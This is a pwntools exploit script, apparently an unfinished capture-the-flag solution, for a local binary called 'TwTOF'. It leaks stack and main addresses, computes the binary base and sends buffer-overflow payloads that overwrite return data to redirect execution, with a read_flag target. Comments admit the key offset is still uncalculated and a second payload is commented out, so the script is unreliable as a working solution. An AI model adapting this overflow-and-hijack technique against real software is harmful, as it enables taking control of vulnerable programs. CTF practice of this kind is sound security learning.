from pwn import * 

binary = "./TwTOF"
p = process(binary)
elf = ELF(binary)
context.binary = binary
context.log_level = 'debug'

s = '''
b * main
b * main+84
b * main+150
b * main+234
b * main+239
b * say73
b * say65
b * read_flag
b * format_hex
'''
gdb.attach(p, s)

# Receive until "TwT sitting on 0x"
p.recvuntil(b"sitting on 0x")

# Get stack address (16 hex chars)
stack_addr = int(p.recv(16), 16)
log.success(f"Stack address: {hex(stack_addr)}")

# Receive until "crying about 0x"
p.recvuntil(b"crying about 0x")

# Get main address (16 hex chars)
main_addr = int(p.recv(16), 16)
log.success(f"Main address: {hex(main_addr)}")

# Calculate binary base (main_addr - main_offset)
elf.address = main_addr - elf.symbols['main']
log.success(f"Binary base: {hex(elf.address)}")

heard_msg = elf.address + 0x8004
offset = heard_msg - 0x1008 - stack_addr 

# The message we want to write
msg = b"I want t"  # Make sure to match exact length/content

# Create payload:
payload = flat(
    stack_addr,
    b'A' * 0xff8,           # Our message to heard_msg
    elf.sym['main'],
    heard_msg
)

# We need to calculate correct offset to heard_msg
# Can you run in gdb and:
# 1. Break at gets
# 2. Print distance between buffer and heard_msg
# 3. Share the offset?

p.sendlineafter("want...?\n", payload)
sleep(2)

payload2 = flat(
    stack_addr,
    b'A' * 0xff8,           # Our message to heard_msg
    elf.sym['format_hex'],
    elf.sym['say73']
)

# We need to calculate correct offset to heard_msg
# Can you run in gdb and:
# 1. Break at gets
# 2. Print distance between buffer and heard_msg
# 3. Share the offset?


#p.sendlineafter("want...?\n", payload2)


p.interactive()